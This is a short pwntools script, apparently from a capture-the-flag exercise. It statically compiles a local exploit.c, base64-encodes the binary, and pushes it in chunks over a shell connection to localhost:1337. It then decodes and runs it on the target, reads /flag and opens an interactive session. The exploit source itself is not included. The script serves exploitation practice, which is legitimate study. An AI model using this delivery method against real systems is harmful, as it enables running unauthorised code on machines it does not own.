from pwn import *
import textwrap
import os

os.system("gcc -E exploit.c -o prep.c")
os.system("musl-gcc prep.c -static -o xpl")
os.system("base64 -w0 xpl > xpl.b64")

conn = remote("localhost", 1337)

conn.recvuntil(b'$')


with open("xpl.b64", "r") as f:
    b64_xpl = f.read()

chunks = textwrap.wrap(b64_xpl, 500)

i = 0

with log.progress("Sending payload") as prog:
    for chunk in chunks:
        conn.sendline(f"echo -n '{chunk}' >> /tmp/xpl.b64".encode())
        conn.recvuntil(b'$')
        i += 1
        if i % 10 == 0:
            prog.status(f"Chunk {i} sent")


conn.sendline(b'base64 -d /tmp/xpl.b64 > /tmp/exploit')
conn.sendline(b'chmod +x /tmp/exploit')
conn.sendline(b'/tmp/exploit')
conn.sendline(b'cat /flag')

conn.interactive()